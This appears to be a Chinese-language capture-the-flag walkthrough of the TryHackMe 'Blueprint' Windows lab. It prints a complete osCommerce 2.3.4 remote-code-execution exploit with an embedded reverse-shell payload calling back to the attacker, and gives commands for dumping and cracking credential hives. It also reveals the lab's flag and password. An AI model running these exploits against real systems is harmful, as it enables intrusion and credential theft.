# Blueprint Writeup
> URL : https://tryhackme.com/room/blueprint
IP : 10.10.66.7

## Scan
- 一樣老梗 `nmap -A 10.10.66.7`
	```
	└─$ nmap -A 10.10.66.7    
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 03:57 EDT
	Nmap scan report for 10.10.66.7
	Host is up (0.32s latency).
	Not shown: 984 closed ports
	PORT      STATE    SERVICE      VERSION
	80/tcp    open     http         Microsoft IIS httpd 7.5
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/7.5
	|_http-title: 404 - File or directory not found.
	135/tcp   open     msrpc        Microsoft Windows RPC
	139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
	443/tcp   open     ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
	|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
	|_http-title: Bad request!
	| ssl-cert: Subject: commonName=localhost
	| Not valid before: 2009-11-10T23:48:47
	|_Not valid after:  2019-11-08T23:48:47
	|_ssl-date: TLS randomness does not represent time
	| tls-alpn: 
	|_  http/1.1
	445/tcp   open     microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
	1165/tcp  filtered qsm-gui
	1971/tcp  filtered netop-school
	3306/tcp  open     mysql        MariaDB (unauthorized)
	5190/tcp  filtered aol
	8080/tcp  open     http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
	|_http-title: Index of /
	49152/tcp open     msrpc        Microsoft Windows RPC
	49153/tcp open     msrpc        Microsoft Windows RPC
	49154/tcp open     msrpc        Microsoft Windows RPC
	49158/tcp open     msrpc        Microsoft Windows RPC
	49159/tcp open     msrpc        Microsoft Windows RPC
	49160/tcp open     msrpc        Microsoft Windows RPC
	Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

	Host script results:
	|_clock-skew: mean: -20m00s, deviation: 34m36s, median: -1s
	|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:24:bb:82:08:6f (unknown)
	| smb-os-discovery: 
	|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
	|   OS CPE: cpe:/o:microsoft:windows_7::sp1
	|   Computer name: BLUEPRINT
	|   NetBIOS computer name: BLUEPRINT\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2021-07-29T08:58:58+01:00
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2021-07-29T07:58:57
	|_  start_date: 2021-07-29T07:49:40

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 131.87 seconds                                  
	```
	- 發現開了很多 port
	- 80 port 進去是 404
		- 先放一邊
- 測試老洞
	- 445 port SMB 有開，又是 Windows 系統
		- 很直覺的掃一下老洞 MS17-010 
		- https://github.com/3ndG4me/AutoBlue-MS17-010
		- ![](https://i.imgur.com/vVpzLMe.png)
		- 發現打不進去 QQ
- 觀察 web
	- 發現 8080 port 跟 443 port 的 web server 都指向同一個 web server
	- 裡面有一個 `oscommerce-2.3.4` 路徑
	- ![](https://i.imgur.com/ME9VmfO.png)

## Exploit
- 尋找 exploit
	- Google `oscommerce-2.3.4 Exploit`
	- https://www.exploit-db.com/exploits/44374

- 部屬 exploit
	- wget https://www.exploit-db.com/download/44374 -O 44374.py
	- 修改路徑
		- ```=python
			# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
			base_url = "http://10.10.66.7:8080/oscommerce-2.3.4/catalog/"
			target_url = "http://10.10.66.7:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
		  ```
- 修改指令
	- `payload += 'system("whoami");'`
	- 接著執行 `44374.py`
	- ![](https://i.imgur.com/A1brcVL.png)
	- 發現禁止 `system`
	
- 嘗試 `phpinfo()`
	- 發現 `disable_functions` 只有禁止 `system`
	- ![](https://i.imgur.com/z9Ln4KP.png)
	- 這邊有非常多種繞過方法，例如
		- passthru
		- shell_exec 
		- exec
	- 在此取用 `passthru`
	
- 再次嘗試 payload
	- `payload += 'passthru("whoami");'`
	- ![](https://i.imgur.com/8eH0aD5.png)
	- 發現他直接吐了一個 system 給我!!
	  
- 準備戳 reverse shell
	- 找到一個 php windows reverse shell
		- https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
		- 基本上他的原理是
			- 寫檔，把base64轉成一隻exe跑起reverse shell
	- 拿來微調一下
	- 修改 `ip`、`port`、然後把 `system` 改 `passthru`
	- 放進 `44374.py`
	- 完整 exploit code
```python=
# Exploit Title: osCommerce 2.3.4.1 Remote Code Execution
# Date: 29.0.3.2018
# Exploit Author: Simon Scannell - https://scannell-infosec.net <contact@scannell-infosec.net>
# Version: 2.3.4.1, 2.3.4 - Other versions have not been tested but are likely to be vulnerable
# Tested on: Linux, Windows

# If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible
# for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page
# is already installed and does not attempt to do any authentication. It is possible for an attacker to directly
# execute the "install_4.php" script, which will create the config file for the installation. It is possible to inject
# PHP code into the config file and then simply executing the code by opening it.


import requests

# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
base_url = "http://10.10.66.7:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.66.7:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

# the payload will be injected into the configuration file via this code
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
# so the format for the exploit will be: '); PAYLOAD; /*
# fsockopen("110.14.7.198",7877);popen("/bin/sh -i <&3 >&3 2>&3", "r");
payload = '\'); \n'
# payload += 'echo passthru("type configure.php");'
payload += """
header('Content-type: text/plain');
$ip   = "10.14.7.198"; //change this 
$port = "7877"; //change this
$payload = "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";
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = passthru($cmd);
"""

payload += '\n\n/*'

data['DB_DATABASE'] = payload

# exploit it
r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")

```
- 本機端開 `nc -vlk 7877` 進行監聽
	- php 端執行下去，就拿到 shell 了!!
	- ![](https://i.imgur.com/QHiq4TY.png)

- 由於我們是 system 權限
	- 所以可以直接拿 admin 的 Root flag
	- 在 `C:\Users\Administrator\Desktop\root.txt.txt`
		- 我猜應該是出題者手殘之類的，不小心打了兩次 `.txt` 吧
	- ![](https://i.imgur.com/ACyckKs.png)
	- `THM{aea1e3ce6fe7f89e10cea833ae009bee}`

## 破密
- 題目說需要破 `"Lab" user NTML hash decrypted`
	- 我覺得題目打錯字，應該是說 NTLM 的 hash XD
- 由於我們是 system 權限，很大，所以可以用指令直接匯出兩個 NTLM 相關檔案、`SAM` 與 `SYSTEM`
	- `reg save HKLM\SAM C:\sam`
	- `reg save HKLM\SYSTEM C:\system`
- 接下來把兩個檔案傳回本機
	- 這邊我用的方法是，直接把這兩個檔案放到 web 路徑中，用wget來載
	- reverse shell
		- `copy sam C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\include`
	- 攻擊機
		- `wget http://10.10.66.7:8080/oscommerce-2.3.4/catalog/install/includes/sam`
		- `wget http://10.10.66.7:8080/oscommerce-2.3.4/catalog/install/includes/user`
- 將 `sam`、`system` 轉為 john 格式
	- `samdump2 system sam > j.txt`
	- 題目問 `LAB` 使用者，所以我們只需要保留這一行
	- `Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::`
		- 而我們要破的真正 hash 是這個
		- `30e87bf999828446a1c1209ddde4c450`
- 暴力破解
	- 其實暴力破解通常是下下策，往往會先試著Google之類尋找網路資源
	- 不過我 Google 這段 hash 值卻出現了一堆爆雷的內容，只好自己破解QQ
	- 通常我愛用 `rockyou.txt` 但在這邊破不出來
	- 後來我採用了這一包
		- https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-dup.txt
		- 不要問我為什麼......隨便找ㄉ
	- `john j.txt --wordlist=/opt/xato-net-10-million-passwords-dup.txt --format=NT`
	- ![](https://i.imgur.com/NSi3OCS.png)
	- 爆出密碼 `googleplus`
- 另外一種網路解法
	- https://crackstation.net/
	- 輸入 `30e87bf999828446a1c1209ddde4c450`
	- ![](https://i.imgur.com/tc69Bnj.png)
	- 回傳密碼為 `googleplus`